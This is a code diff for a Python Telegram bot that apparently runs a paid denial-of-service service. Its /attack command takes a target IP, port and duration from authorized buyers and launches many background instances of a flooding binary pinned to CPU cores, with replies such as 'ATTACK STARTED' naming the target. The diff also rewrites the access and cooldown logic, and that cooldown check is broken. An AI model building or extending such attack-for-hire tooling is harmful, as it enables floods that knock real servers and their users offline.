@@ -389,7 +389,7 @@ def initialize_bot(bot, bot_id):
         num_instances = (900 // threads_per_instance)
         core_mapping = [0, 0, 1, 1, 0, 0, 1, 1, 0]
         for i in range(num_instances):
-            full_command = ['nohup', './000', str(target), str(port), str(time), str(threads_per_instance)]
+            full_command = ['nohup', './gondareddy', str(target), str(port), str(time), str(threads_per_instance)]
             core = core_mapping[i % len(core_mapping)]
             taskset_command = ['taskset', '-c', str(core)] + full_command
             attack_process = subprocess.Popen(taskset_command)
@@ -401,51 +401,39 @@ def initialize_bot(bot, bot_id):
         response = f"@{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
         bot.reply_to(message, response, reply_markup=markup)
     
-    @bot.message_handler(commands=['attack'])
-def handle_attack(message):
-    user_id = str(message.chat.id)
-    allowed_user_ids, expirations = read_users(bot_id)
-    allowed_admin_ids = read_admins(bot_id)
-    owner_name = get_owner_name(bot_id)
+    attack_cooldown = {}
+    COOLDOWN_TIME = 0
     
-    if user_id in allowed_user_ids or user_id in allowed_admin_ids:
-        # Check if user is on cooldown
-        if user_id in attack_cooldown:
-            cooldown_remaining = (datetime.now() - attack_cooldown[user_id]).total_seconds()
-            if cooldown_remaining < 0:
-                response = f"You are on cooldown. Please wait {cooldown_remaining} seconds before running the /attack command again."
-                bot.reply_to(message, response)
-                return
-        
-        command = message.text.split()
-        if len(command) == 4:
-            target = command[1]
-            try:
-                port = int(command[2])
-                time_duration = int(command[3])
-                
-                # Check for maximum allowed time for non-admins
-                if user_id not in allowed_admin_ids and time_duration > 300:
-                    response = "Error: Time interval must be less than 300 seconds for regular users."
+    @bot.message_handler(commands=['attack'])
+    def handle_attack(message):
+        user_id = str(message.chat.id)
+        allowed_user_ids, expirations = read_users(bot_id)
+        allowed_admin_ids = read_admins(bot_id)
+        owner_name = get_owner_name(bot_id)
+        if user_id in allowed_user_ids or user_id in allowed_admin_ids:
+            if user_id not in allowed_admin_ids:
+                if user_id in attack_cooldown and (datetime.now() - attack_cooldown[user_id]).seconds < 0:
+                    response = "You Are On Cooldown . Please Wait 0 seconds Before Running The /attack Command Again."
                     bot.reply_to(message, response)
                     return
-                
-                # Log command and start attack
-                log_command(user_id, target, port, time_duration, '/attack')
-                start_attack_reply(message, target, port, time_duration, owner_name)
-                
-                # Set cooldown time
-                attack_cooldown[user_id] = datetime.now() + timedelta(seconds=time_duration)
-                return
-            except ValueError:
-                response = "Invalid command syntax. Please use: /attack <target> <port> <time>"
+                attack_cooldown[user_id] = datetime.now()
+            command = message.text.split()
+            if len(command) == 4:
+                target = command[1]
+                port = int(command[2])
+                time = int(command[3])
+                if user_id not in allowed_admin_ids and time > 301:
+                    response = "Error: Time interval must be less than 300."
+                else:
+                    log_command(user_id, target, port, time, '/attack')
+                    start_attack_reply(message, target, port, time, owner_name)
+                    return
+            else:
+                response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
         else:
-            response = "✅ Usage: /attack <target> <port> <time>"
-    else:
-        response = f"You are not authorized to use this command.\n\nKindly contact the admin to purchase access: {owner_name}."
+            response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
+        bot.reply_to(message, response)
     
-    bot.reply_to(message, response)
-
     def finish_message(message, target, port, attack_time, owner_name, scheduled_time):
         global Attack
         chat_id = message.chat.id
